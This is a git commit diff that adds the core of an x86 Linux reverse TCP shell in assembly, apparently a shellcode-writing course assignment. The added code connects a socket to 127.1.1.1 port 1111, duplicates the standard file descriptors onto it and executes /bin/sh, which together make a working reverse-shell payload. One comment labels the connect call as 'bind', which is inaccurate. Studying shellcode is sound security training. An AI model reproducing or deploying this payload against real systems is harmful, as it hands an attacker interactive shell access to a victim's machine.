4de0f21a6acf04db706d7825d5ff6c33a4db5ec3
Reuben Sammut <reubensammut@gmail.com>
2014-03-19 17:50:04 +0100

    Initial working version of reversetcp.asm

--- Assignments/02 - Shell Reverse Tcp/reversetcp.asm
+++ Assignments/02 - Shell Reverse Tcp/reversetcp.asm
@@ -21,4 +21,42 @@ _start:
 	int 0x80
 	mov edi, eax
 
+	; connect 
+	push edx	 ; sin_zero[4-7]
+	push edx	 ; sin_zero[0-3]
+	push 0x0101017F	 ; sin_addr(127.1.1.1)
+	push word 0x5704 ; sin_port (1111 = 0x0457)
+	push word 0x2	 ; sin_family = AF_INET (2)
+	mov ebp, esp
+	push 0x10	 ; socklen
+	push ebp	 ; addr pointer
+	push edi	 ; sockfd
+	
+	mov al, 0x66	 ; socketcall
+	mov bl, 0x3	 ; cmd = bind (2)
+	lea ecx, [esp]
+	int 0x80
+
+	; dup2
+	mov ecx, edx
+	mov cl, 0x2 	 ; start from fd = 2 (stderr) and go down to 0
+
+dup2:	mov al, 0x3F	 ; dup2
+	mov ebx, edi	 ; clientfd
+	int 0x80
+	dec ecx
+	jns dup2
+
+	; execve
+	push edx	 ; 
+	push 0x68732f6e	 ; 
+	push 0x69622f2f  ; "//bin/sh\0"
+	mov ebp, esp     ; loc of "//bin/sh\0"
+	push edx	 ; NULL
+	lea edx, [esp]   ; evp = { NULL }
+	push ebp         ; push loc of "//bin/sh\0"
+	lea ecx, [esp]	 ; argp = { "//bin/sh\0", NULL }
+	mov ebx, ebp     ; //bin/sh\0
+	mov al, 0x0b     ; execve
+	int 0x80
 
